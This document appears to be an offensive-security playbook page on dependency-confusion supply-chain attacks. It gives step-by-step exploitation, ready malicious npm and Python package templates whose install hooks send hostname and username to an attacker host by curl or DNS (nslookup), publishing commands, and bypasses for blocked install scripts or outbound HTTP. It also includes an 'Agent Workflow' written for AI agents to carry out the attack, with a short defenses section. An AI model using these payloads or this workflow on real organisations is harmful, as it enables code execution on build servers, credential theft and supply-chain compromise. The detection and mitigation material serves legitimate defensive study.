# Dependency Confusion

> **Summary**: Dependency confusion (substitution attack) occurs when a package manager resolves a dependency name from a public registry instead of the intended private/internal registry, leading to installation of an attacker-controlled package with arbitrary code execution.
> **Impact**: Remote code execution on build servers, CI/CD pipelines, and developer machines during package installation.
> **Typical Severity**: Critical

## Detection

### Indicators
- Organization uses private/internal package registries alongside public registries (npm, PyPI, RubyGems, Maven, NuGet)
- Package manager configuration includes both internal and public registry URLs
- Lockfiles or manifests reference package names that do not exist on public registries
- Internal packages use organization-specific naming prefixes (e.g., `@company/*`, `company-*`)

### Automated Detection
- Audit package manifests for internal names not registered on public registries
- Compare `package.json`, `requirements.txt`, `pom.xml`, `*.csproj` against public registry availability
- Use tools like `confused` or `snync` to check for vulnerable packages

### Manual Detection
1. Extract package names from dependency manifests and lockfiles
2. Check if each name exists on the corresponding public registry
3. If an internal package name is available on a public registry, the project may be vulnerable
4. Check package manager configuration for registry priority and fallback behavior

## Exploitation

### Prerequisites
- Target organization uses private packages with names that are not registered on public registries
- Package manager is configured to check public registries (either as primary or fallback)
- Build/install process runs with network access to public registries

### Step-by-Step

1. **Discover internal package names**: Find names of private packages used by the target.

   **Sources for package name discovery:**
   ```bash
   # JavaScript: package.json, package-lock.json, yarn.lock
   # Look for scoped packages without public registry presence
   grep -oP '"@[^"]+"|"[a-z]+-[a-z]+"' package.json

   # Python: requirements.txt, setup.py, pyproject.toml, Pipfile
   grep -v '^#' requirements.txt | grep -oP '^[a-zA-Z0-9_-]+'

   # Ruby: Gemfile, Gemfile.lock
   grep -oP "gem '[^']+'" Gemfile

   # Java: pom.xml (groupId + artifactId)
   grep -oP '<artifactId>[^<]+' pom.xml

   # .NET: *.csproj, packages.config
   grep -oP 'Include="[^"]+' *.csproj
   ```

   **Other discovery vectors:**
   - Public GitHub repositories with exposed manifests
   - JavaScript source maps or bundled code containing import paths
   - Error messages revealing internal package names
   - Job postings or documentation mentioning internal tooling
   - CI/CD configuration files (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`)

   **Success**: List of internal package names that do not exist on public registries.

2. **Verify public registry availability**: Check if the package name is available for registration.
   ```bash
   # npm
   npm view <PACKAGE_NAME> 2>&1 | grep -i "not found\|404"

   # PyPI
   curl -s "https://pypi.org/pypi/<PACKAGE_NAME>/json" | head -1

   # RubyGems
   gem search -r <PACKAGE_NAME>

   # NuGet
   curl -s "https://api.nuget.org/v3-flatcontainer/<PACKAGE_NAME>/index.json"
   ```
   **Success**: Package name is not registered (404 response).

3. **Create malicious package**: Build a package with the same name and a higher version number.

   **npm example:**
   ```json
   {
     "name": "<INTERNAL_PACKAGE_NAME>",
     "version": "99.99.99",
     "scripts": {
       "preinstall": "curl https://<ATTACKER_CALLBACK>/?pkg=$(hostname)&user=$(whoami)"
     }
   }
   ```

   **Python example (setup.py):**
   ```python
   from setuptools import setup
   from setuptools.command.install import install
   import os

   class PostInstall(install):
       def run(self):
           os.system("curl https://<ATTACKER_CALLBACK>/?h=$(hostname)&u=$(whoami)")
           install.run(self)

   setup(
       name="<INTERNAL_PACKAGE_NAME>",
       version="99.99.99",
       cmdclass={"install": PostInstall},
   )
   ```

   **Success**: Malicious package created with install-time code execution.

4. **Publish to public registry**:
   ```bash
   # npm
   npm publish

   # PyPI
   twine upload dist/*

   # RubyGems
   gem push <PACKAGE_NAME>-99.99.99.gem
   ```
   **Success**: Package published and available on the public registry.

5. **Wait for execution**: When the target's CI/CD pipeline or developer runs `npm install`, `pip install`, etc., the package manager fetches the higher-versioned public package instead of the internal one.

   **Success**: Callback received from target infrastructure confirming code execution.

### Payloads

#### npm (preinstall hook)
```json
{
  "name": "<INTERNAL_PKG>",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "curl https://<ATTACKER>/?h=$(hostname)&u=$(whoami)&d=$(pwd)"
  }
}
```

#### Python (setup.py install hook)
```python
import os, socket
from setuptools import setup
from setuptools.command.install import install

class Exfil(install):
    def run(self):
        os.system(f"nslookup $(whoami).$(hostname).<ATTACKER_DOMAIN>")
        install.run(self)

setup(name="<INTERNAL_PKG>", version="99.99.99", cmdclass={"install": Exfil})
```

#### Ruby (Gemfile extension)
```ruby
Gem::Specification.new do |s|
  s.name = "<INTERNAL_PKG>"
  s.version = "99.99.99"
  s.extensions = ["extconf.rb"]  # Runs during install
end
```

#### DNS-based exfiltration (stealthy)
```bash
# In any install hook:
nslookup "$(whoami).$(hostname).$(cat /proc/sys/kernel/hostname).<ATTACKER_DOMAIN>"
```

### Proof of Concept

```bash
# 1. Find internal package names from public repos
# Search for exposed package.json files on GitHub
# GitHub dork: "org:<TARGET_ORG>" filename:package.json

# 2. Check availability
npm view @<TARGET_ORG>/internal-utils 2>&1

# 3. Create and publish (authorized testing only)
mkdir dependency-confusion-poc && cd dependency-confusion-poc
npm init -y
# Edit package.json with target name and callback
npm publish --access public

# 4. Monitor for callbacks
# Use Burp Collaborator, interactsh, or custom DNS server
```

## Bypasses

- If `preinstall`/`postinstall` scripts are blocked by npm policy, use Python's `setup.py` which executes on `pip install` from source
- If the organization pins exact versions, publish a package with that exact version (may win if resolution order favors public)
- If scoped packages are used (`@org/pkg`), scopes are bound to organizations on npm -- this approach will not work for npm scopes, but may work for unscoped internal packages
- For Python, even if `--only-binary` is set, a `.tar.gz` sdist can execute `setup.py` on install
- Use DNS exfiltration if outbound HTTP is blocked from CI runners

## Escalation

- **CI/CD code execution to supply chain compromise**: Inject backdoors into build artifacts
- **Developer machine compromise to source code theft**: Access private repositories and credentials
- **Build server access to secrets theft**: Read environment variables containing API keys, tokens, and credentials
- **Lateral movement**: Use compromised CI/CD credentials to access production infrastructure

## Ecosystem-Specific Defenses and Secure Configurations

### npm / Yarn / pnpm
- Use scoped packages (`@company/*`) bound to private registry
- `.npmrc`: `@company:registry=https://registry.corp.example/npm/`
- Use `npm ci` with lockfile integrity checks

### Python (pip)
- Use `--index-url` (NOT `--extra-index-url`) pointing to internal proxy
- Use `pip install --require-hashes -r requirements.txt`
- Generate hashed requirements: `pip-compile --generate-hashes`

### .NET (NuGet)
- Use Package Source Mapping in `nuget.config`
- Map internal package patterns to internal feeds only

### Java (Maven/Gradle)
- Configure repository mirrors in `settings.xml`
- Use repository managers (Nexus, Artifactory) as single source of truth

## Tools

| Tool | Usage |
|------|-------|
| confused | `confused -l npm <PACKAGE_JSON>` -- Check npm packages for confusion |
| snync | Detect dependency confusion in npm projects |
| dep-confusion-checker | Automated checking across ecosystems |
| Interactsh | `interactsh-client` -- Out-of-band callback server for detecting execution |
| Burp Collaborator | Callback server for verifying code execution |

## References

- [Alex Birsan - Dependency Confusion (Original Research)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Microsoft - 3 Ways to Mitigate Dependency Confusion](https://azure.microsoft.com/en-us/blog/3-ways-to-mitigate-risk-using-private-package-feeds/)
- [Snyk - Dependency Confusion Explained](https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/)

## Agent Workflow
> Step-by-step instructions for an AI agent to test for dependency confusion.

### Phase 1: Discovery
1. Find internal/private package names from all available sources:
   - Public GitHub repositories: search for exposed `package.json`, `requirements.txt`, `pom.xml`, `*.csproj`, `Gemfile`.
   - JavaScript source maps or bundled code containing import paths.
   - CI/CD configuration files (`.github/workflows/`, `Jenkinsfile`, `.gitlab-ci.yml`).
   - Job postings or documentation mentioning internal tooling names.
   - Error messages revealing internal package names.
2. Extract package names from discovered manifests:
   ```bash
   grep -oP '"@[^"]+"|"[a-z]+-[a-z]+"' package.json
   grep -v '^#' requirements.txt | grep -oP '^[a-zA-Z0-9_-]+'
   grep -oP '<artifactId>[^<]+' pom.xml
   ```
3. Build a list of candidate internal package names that might not exist on public registries.

### Phase 2: Validation
1. Check if each candidate package name is available on the corresponding public registry:
   ```bash
   # npm
   npm view <PACKAGE_NAME> 2>&1 | grep -i "not found\|404"
   # PyPI
   curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/pypi/<PACKAGE_NAME>/json"
   # RubyGems
   gem search -r ^<PACKAGE_NAME>$
   # NuGet
   curl -s -o /dev/null -w "%{http_code}" "https://api.nuget.org/v3-flatcontainer/<PACKAGE_NAME>/index.json"
   ```
2. If the package name returns 404 (not found), it is a candidate for dependency confusion.
3. Verify the target's package manager configuration allows fallback to public registries (check `.npmrc`, `pip.conf`, `nuget.config`, `settings.xml`).
4. Confirm the target actually uses the package (not just referenced in documentation).

### Phase 3: Exploitation
1. Create a package with the same name and a higher version number (`99.99.99`).
2. Add a benign callback in the install hook (DNS or HTTP to your controlled server):
   - npm: `"preinstall": "curl https://<ATTACKER_CALLBACK>/?pkg=$(hostname)&user=$(whoami)"`
   - Python: `os.system("curl https://<ATTACKER_CALLBACK>/?h=$(hostname)")` in `setup.py` install hook
   - Ruby: Use `extconf.rb` extension that runs during install
3. Publish the package to the public registry:
   ```bash
   npm publish --access public    # npm
   twine upload dist/*            # PyPI
   gem push <PKG>-99.99.99.gem   # RubyGems
   ```
4. Wait for the target's CI/CD pipeline or developer to run `npm install` / `pip install` / etc.
5. Monitor for callbacks confirming code execution.

### Phase 4: Escalation
1. If callback is received, document the compromised environment (hostname, username, working directory).
2. Assess impact: CI/CD code execution can lead to supply chain compromise (inject backdoors into build artifacts).
3. Developer machine compromise leads to source code theft and credential harvesting.
4. Build server access exposes environment variables containing API keys, tokens, and secrets.
5. Document lateral movement possibilities from the compromised CI/CD environment to production infrastructure.

## Decision Tree

```
Start: Discover internal package names
  |
  +---> Package name available on public registry?
  |       +---> npm: Scoped (@org/pkg)? --> Cannot claim scoped packages
  |       +---> npm: Unscoped? --> Publish higher version
  |       +---> PyPI: Name available? --> Publish higher version
  |       +---> RubyGems: Name available? --> Publish higher version
  |       +---> Maven: GroupId claimable? --> Publish higher version
  |
  +---> Package already exists on public registry?
  |       +---> Published by attacker: Already exploited
  |       +---> Published by org: Not vulnerable (namespace claimed)
  |
  +---> Target pins exact versions?
  |       +---> Publish exact version (may win if public preferred)
  |       +---> Use DNS exfiltration if HTTP blocked from CI runners
  |
  +---> preinstall/postinstall scripts blocked?
          +---> Use Python setup.py (runs on pip install from source)
          +---> Use Ruby extconf.rb (runs during gem install)
```

## Success Criteria
- [ ] Internal package names discovered from public sources
- [ ] At least one package name confirmed available on a public registry
- [ ] Package published to public registry with install-time callback
- [ ] Callback received from target infrastructure confirming code execution
- [ ] Compromised environment details documented (hostname, user, CI/CD system)

## Cross-References

- [JavaScript Analysis](../../recon/javascript-analysis.md) -- Discovering internal package names from JS bundles
- [Whitebox Pentesting](whitebox-pentesting.md) -- Reviewing dependency configurations in source code
